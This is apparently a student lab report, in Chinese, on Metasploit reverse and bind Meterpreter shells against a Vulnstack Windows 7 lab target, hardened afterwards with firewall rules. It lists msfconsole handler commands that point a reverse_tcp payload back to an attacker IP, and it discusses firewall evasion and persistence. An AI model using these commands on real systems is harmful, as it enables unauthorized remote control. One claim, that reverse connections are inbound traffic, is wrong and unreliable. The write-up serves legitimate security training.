# 渗透测试实验报告 - 正反向Shell攻防实践
### 目标机为vulnstack-win7,攻击机为kali
 实验信息

· 实验名称: 基于MSF的正反向Shell攻防实践

· 实验日期: 2025-10-28

· 实验环境: Kali Linux (攻击机) + Vulnstack-Win7 (靶机)

一、实验目的

1. 掌握MSFVenom工具生成定制化有效负载的方法
2. 理解正向Shell与反向Shell的本质区别及适用场景
3. 学习通过防火墙规则配置进行主机安全加固
4. 分析不同网络环境下的Shell连接策略选择

二、实验环境

角色 系统 IP地址 备注
攻击机 Kali Linux 192.168.19.128 渗透测试平台

目标机 Windows 7 192.168.19.135 Vulnstack漏洞环境

三、实验步骤

任务1：环境准备

· 下载并安装Vulnstack-Win7漏洞环境

· 确保攻击机与目标机网络连通性

任务2：生成有效负载
1. 生成反向TCP Shell<br>
(1)：打开kali终端，执行命令生成payload
![生成payload](payload.png)

(2)查询目标机ip及开放端口
![目标机ip和开放端口](cxkfdk.png)
2. 生成正向TCP Shell
![正向TCP Shell](zxtcp.png)

3. 配置Metasploit/multi/handler模块<br>
(1)启动msfconsole,加载反向Shell监听模块


```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.19.128
set LPORT 7777
exploit
```
![启动msfconsole](msfconsole.png)
加载反向shell
![加载反向shell](fxshell.png)
配置正向Shell连接

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 192.168.19.135
set LPORT 7777
exploit
```
# 对目标windows主机进行安全加固
### 创建入站阻止规则
 
1. 进入win7 虚拟机

2. 点击入站规则→新建规则，选择“端口”→“TCP”→输入需阻止的端口→选择“阻止连接”→应用到“域、专用、公用”所有配置文件→命名规则。
![设置入站规则](rzgz.png)
### 创建出站阻止规则
 
1. 点击出站规则→新建规则，重复上述步骤，阻止相同端口的出站连接。
![设置出站规则](czgz.png)

防御效果验证

· 执行生成的Shell程序

· 验证正向/反向Shell均无法建立连接

· 记录防火墙拦截日志

正向超时

![正向超时](zxcs.png)

反向超时

![反向超时](fxcs.png)
实验结果与分析

1. 正反向Shell对比

反向Shell 目标机→攻击机 目标机有公网IP或出站限制宽松 绕过入站防火墙，需要攻击机有固定IP

正向Shell 攻击机→目标机 目标机无出网权限或内网环境 依赖目标机开放端口，易被入站规则拦截

防御效果验证结果

· 加固前: 正反向Shell均能成功建立连接

· 加固后:
  · 反向Shell被出站规则阻断

  · 正向Shell被入站规则阻断

结论: 防火墙规则配置有效防御了本次攻击
# 在真实的渗透测试中，什么场景下更适合使用反向Shell?什么场景下更适合使用正向Shell？
### 更适合反向Shell：
  1. 目标主机位于内网，无公网IP
  攻击者无法主动连接目标，只能让目标主动“反弹”连接攻击者的公网监听端口。
  2. 目标主机出站流量未被严格限制
  即使目标主机入站端口被封，只要它能访问外网（如DNS、HTTP等），就可以通过反向shell建立连接。
  3. 绕过防火墙或IPS/IDS设备
  反向shell可以通过常见端口（如80、443）或加密通道（如HTTPS、DNS隧道）伪装流量，降低被检测的风险。
  4. 目标主机存在命令执行漏洞，但无法上传文件或开启服务
  此时可通过一句话反弹命令（如bash、python、perl等）直接获取shell，无需上传木马。<br>
### 更适合正向Shell：
  1. 目标主机拥有公网IP，且端口可访问
  攻击者可以直接连接目标主机的开放端口（如通过漏洞上传木马并监听端口）。
  2. 目标主机处于攻击者同一内网中
  如内网横向渗透阶段，攻击者已通过跳板机进入内网，可直接连接目标主机的正向shell。
  3. 目标主机出网受限（如仅允许特定白名单IP出站）
此时反向shell无法成功回连，只能尝试正向连接
  4. 需要长期维持访问，且目标主机稳定在线
  正向shell可结合自启动、计划任务等方式实现持久化，适合控制服务器类目标。

  
# 仅通过配置出站规则，能否有效防御所有反向链接？为什么？
仅配置出站规则不能有效防御所有反向链接
1. 出站规则无法控制入站流量  
出站规则仅对内部主机主动发起的连接生效，而反向链接（reverse connection）是外部主机主动连接到内部主机，属于入站流量。
2. 出站规则只能限制部分反向连接行为，但无法防御所有类型的反向链接，尤其是在攻击者使用协议伪装、隧道技术或利用入站通道时。
# 除了基于端口的防火墙规则，还有哪些更高级的加固手段可以防御此类攻击？
1. 应用层协议识别（DPI）
- 深度包检测（DPI）技术可以分析数据包的内容，识别隐藏在合法协议（如HTTP、DNS、ICMP）中的恶意通信。
2. 行为分析与异常检测
- 基于行为建模的安全系统（如EDR、NDR）可监控主机或网络的通信行为。
3. 协议封装与隧道识别
5. 应用白名单与零信任架构
6. 网络分段与微隔离
7. 加密流量检测